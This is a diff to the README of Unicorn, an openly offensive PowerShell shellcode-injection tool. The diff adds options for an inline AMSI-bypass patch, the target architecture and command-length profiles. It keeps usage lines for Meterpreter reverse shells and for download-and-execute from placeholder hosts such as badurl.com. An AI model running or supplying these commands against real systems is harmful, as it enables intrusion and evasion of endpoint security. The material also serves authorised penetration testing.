@@ -55,14 +55,14 @@ aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2Vl
                 
 -------------------- Magic Unicorn Attack Vector -----------------------------
 
-Native x86 powershell injection attacks on any Windows platform.
+PowerShell shellcode injection for x86 and x64 targets.
 Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
 Twitter: @TrustedSec, @HackingDave
 Credits: Matthew Graeber, Justin Elze, Chris Gates
 
 Happy Magic Unicorns.
 
-Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
+Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt> <generator options>
 PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
 PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
 Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
@@ -80,9 +80,29 @@ Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted
 Help Menu: python unicorn.py --help
 ```
 
+###                -----GENERATOR OPTIONS----
+
+Unicorn now emits one PowerShell child command. With `--amsi inline`, the AMSI patch and shellcode loader
+run in that same child process. With `--amsi off`, Unicorn omits the AMSI stage.
+
+Use `--profile cmd` for an 8191-character command context. Use `--profile powershell` for a
+32767-character context. Unicorn rejects an output that exceeds the selected limit.
+
+Use `--arch x86` or `--arch x64` to select the child PowerShell architecture. Supply shellcode that
+matches that architecture. The default is x86.
+
+Use `--seed <value>` to reproduce a generated variant. Each run writes `unicorn_manifest.json` with the
+seed, architecture, AMSI mode, command lengths, APIs, and source shellcode SHA-256.
+The loader variant uses either a `memset` byte-copy loop or `Marshal.Copy`; the selected API is recorded
+in the manifest.
+
 ###                -----POWERSHELL ATTACK INSTRUCTIONS----
 
-Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.
+Everything is now generated in `powershell_attack.txt`, `unicorn.rc` when Metasploit is used, and
+`unicorn_manifest.json`. The text file contains the code needed to inject the PowerShell attack into
+memory. You need a place that supports remote command execution. Use `--profile cmd` for an 8191-character
+command context. This attack also supports `windows/download_exec`. When using download and execute, run
+`python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe`.
 
 Note that you will need to have a listener enabled in order to capture the attack.
 
@@ -229,24 +249,29 @@ issues.
 ###                 -----Custom Shellcode Generation Method----
 
 This method will allow you to insert your own shellcode into the Unicorn attack. The PowerShell code
-will increase the stack side of the powershell.exe (through VirtualAlloc) and inject it into memory.
+will allocate memory with calloc, copy the bytes, set the memory executable with VirtualProtect, and
+start a thread with CreateThread.
 
-Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the 
-following format or it will not work:
+Note that in order for this to work, your txt file that you point Unicorn to must be formatted in the
+following format:
 
 0x00,0x00,0x00 and so on.
 
-Also note that there is size restrictions. The total length size of the PowerShell command cannot exceed
-the size of 8191. This is the max command line argument size limit in Windows.
+Metasploit C output with \x00 byte literals is also supported.
+
+Unicorn records the command length, architecture, seed, AMSI mode, APIs, and shellcode SHA-256 in
+unicorn_manifest.json.
 
 Usage:
 
     python unicorn.py shellcode_formatted_properly.txt shellcode
+    python unicorn.py shellcode_formatted_properly.txt shellcode --arch x64 --profile cmd
+    python unicorn.py shellcode_formatted_properly.txt shellcode --amsi off --profile cmd
+    python unicorn.py shellcode_formatted_properly.txt shellcode --seed test-run
 
 Next simply copy the powershell command to something you have the ability for remote command execution.
 
-NOTE: THE FILE MUST PROPERLY BE FORMATTED IN A 0x00,0x00,0x00 TYPE FORMAT WITH NOTHING ELSE OTHER THAN
-YOUR SHELLCODE IN THE TXT FILE.
+NOTE: Supply shellcode that matches the selected architecture. x86 is the default.
 
 There are some caveats with this attack. Note that if your payload size is large in nature it will not
 fit in cmd.exe. That means that from a command line argument perspective if you copy and paste you will 
